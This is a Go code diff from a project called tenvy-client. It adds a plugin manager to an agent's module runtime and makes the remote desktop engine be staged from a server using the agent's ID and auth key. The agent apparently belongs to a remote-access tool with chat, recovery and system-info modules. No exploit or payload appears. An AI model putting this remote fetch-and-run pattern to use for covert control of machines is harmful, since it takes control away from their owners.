@@ -21,6 +21,7 @@ import (
 	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
 	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
 	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
+	"github.com/rootbay/tenvy-client/internal/plugins"
 	"github.com/rootbay/tenvy-client/internal/protocol"
 )
 
@@ -34,6 +35,7 @@ type ModuleRuntime struct {
 	Provider     systeminfo.AgentInfoProvider
 	BuildVersion string
 	Config       protocol.AgentConfig
+	Plugins      *plugins.Manager
 }
 
 func envBool(name string) bool {
@@ -324,6 +326,7 @@ func (a *Agent) moduleRuntime() ModuleRuntime {
 		Provider:     a,
 		BuildVersion: a.buildVersion,
 		Config:       a.config,
+		Plugins:      a.plugins,
 	}
 }
 
@@ -538,8 +541,35 @@ func (m *remoteDesktopModule) currentEngine() remotedesktop.Engine {
 	return m.engine
 }
 
-func defaultRemoteDesktopEngineFactory(_ context.Context, _ ModuleRuntime, cfg remotedesktop.Config) (remotedesktop.Engine, error) {
-	return remotedesktop.NewRemoteDesktopStreamer(cfg), nil
+func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime ModuleRuntime, cfg remotedesktop.Config) (remotedesktop.Engine, error) {
+	base := remotedesktop.NewRemoteDesktopStreamer(cfg)
+
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return base, nil
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	result, err := plugins.StageRemoteDesktopEngine(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent)
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("remote desktop: engine staging failed: %v", err)
+		}
+		return base, nil
+	}
+
+	return remotedesktop.NewManagedRemoteDesktopEngine(base, result.EntryPath, result.Manifest.Version, manager, runtime.Logger), nil
 }
 
 type audioModule struct {
